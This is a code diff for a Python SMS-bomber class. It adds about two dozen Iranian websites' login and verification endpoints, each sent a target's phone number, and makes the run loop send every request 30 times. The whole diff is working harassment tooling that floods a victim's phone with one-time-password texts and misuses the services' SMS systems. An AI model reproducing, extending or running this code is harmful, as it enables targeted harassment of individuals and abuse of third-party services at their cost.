@@ -10,6 +10,31 @@ class Bomber(Process):
         self.name = task_id
         self.target = target
         self.apis = [
+            {"url":"https://gw.taaghche.com/v4/site/auth/login","paramet":{"contact":f"0{self.target}", "forceOtp": False},"method":"POST"},
+            {"url":"https://rest.talentcoach.ir/api/v1/service/trainees/","paramet":{"cellphone": f"+98{self.target}"},"method":"POST"},
+            {"url":"https://api.ostadkr.com/login","paramet":{"mobile": f"0{self.target}"},"method":"POST"},
+            {"url":f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{self.target}/sms?cCode=%2B98","paramet":None,"method":"GET"},
+            {"url":"https://api.oteacher.org/v1/otp","paramet":{"isLogin":False, "isUpdatePhone":False, "phone":f"98{self.target}"},"method":"POST"},
+            {"url":"https://www.safirstores.com/index.php?route=account/login/getRandCode","paramet":{"telephone":f"0{self.target}"},"method":"POST"},
+            {"url":f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{self.target}","paramet":None,"method":"GET"},
+            {"url":"https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox","paramet":{"contactInfo[mobile]":f"0{self.target}", "contactInfo[password_confirm]":None, "submit_register":1, "contactInfo[agreementAccepted]":1},"method":"POST"},
+            {"url":"https://auth.basalam.com/otp-request","paramet":{"client_id":11, "mobile":f"0{self.target}"},"method":"POST"},
+            {"url":"https://www.snapptrip.com/register","paramet":{"country_code":"+98", "country_id":"860", "email":"betoche@gmail.com", "lang":"fa", "mobile_phone":f"0{self.target}","password":"123456789"},"method":"POST"},
+            {"url":"https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL","paramet":{"mobile":f"0{self.target}"},"method":"POST"},
+            {"url":f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{self.target}","paramet":None,"method":"POST"},
+            {"url":"https://api.timcheh.com/auth/otp/send","paramet":{"mobile":f"0{self.target}"},"method":"POST"},
+            {"url":"https://account.bama.ir/api/otp/Generate/v2","paramet":{"appname":"bamawebapplication", "cellNumber":f"0{self.target}", "smsfor":6},"method":"POST"},
+            {"url":"https://cyclops.drnext.ir/v1/patients/auth/send-verification-token","paramet":{"mobile":f"0{self.target}", "source":"besina"},"method":"POST"},
+            {"url":"https://mobapi.banimode.com/api/v2/auth/request","paramet":{"phone":f"0{self.target}"},"method":"POST"},
+            {"url":"https://www.buskool.com/send_verification_code","paramet":{"phone":f"0{self.target}"},"method":"POST"},
+            {"url":"https://uiapi2.saapa.ir/api/otp/sendCode","paramet":{"from_meter_buy":False, "mobile":f"0{self.target}"},"method":"POST"},
+            {"url":"https://app.mydigipay.com/digipay/api/users/send-sms","paramet":{"cellNumber":f"0{self.target}", "device":{"deviceAPI":"WEB_BROWSER", "deviceId": "d520c7a8-421b-4563-b955-f5abc56b97ec", "deviceModel":"WEB_BROWSER", "osName":"WEB"}},"method":"POST"},
+            {"url":"https://www.technolife.ir/shop","paramet":{"g-recaptcha-response":"", "query":"query check_customer_exists($username: String ,$repeat:Boolean){\n  check_customer_exists(username: $username , repeat:$repeat){\n    result\n    request_id\n    }\n  }", "variables":{"username":f"0{self.target}"}},"method":"POST"},
+            {"url":"https://football360.ir/api/auth/verify-phone/","paramet":{"phone_number":f"+98{self.target}"},"method":"POST"},
+            {"url":"https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode","paramet":{"Identity":{"Token":None}, "Parameters":{"ApplicationType":"Web", "ApplicationUniqueToken":None, "ApplicationVersion":"1.0.0", "MobileNumber":f"0{self.target}", "UniqueToken":None}},"method":"POST"},
+            {"url":"https://api.esam.ir/api/account/RegisterOrLogin","paramet":{"mobile":f"0{self.target}", "present_type":"WebApp", "registration_method":0, "serialNumber":"React1234"},"method":"POST"},
+            {"url":"https://api.sibche.com/profile/sendCode","paramet":{"mobile":f"0{self.target}"},"method":"POST"},
+            
             {"url":f"https://api.digikala.com/v1/user/authenticate/","paramet":{"username":self.target},"method":"POST"},
             {"url":f"https://i.devslop.app/app/ifollow/api/otp.php","paramet":f"number={self.target}&state=number&","method":"POST"},
             {"url":f"https://chamedoon.com/api/v1/membership/guest/request_mobile_verification","paramet":{"mobile":self.target},"method":"POST"},
@@ -76,19 +101,16 @@ class Bomber(Process):
             elif url["method"] == "GET":
                 result = getRequest(url["url"])
                 
-            if result.status_code == 200:
+            if result.status_code == 200 or result.status_code == 202:
                 self.finish += 1
             else: self.isnotcurrect += 1
                 
         except Exception as err:self.isnotcurrect += 1;print(err)
         
     def run(self):
-        # with ProcessPoolExecutor(max_workers=cpu_count()) as executor:
-        #     for _ in range(3):
-        #         executor.map(self.startBomber, self.apis)
-        
-        for api in self.apis:
-            self.startBomber(api)
+        for _ in range(30):
+            for api in self.apis:
+                self.startBomber(api)
             
 
                         
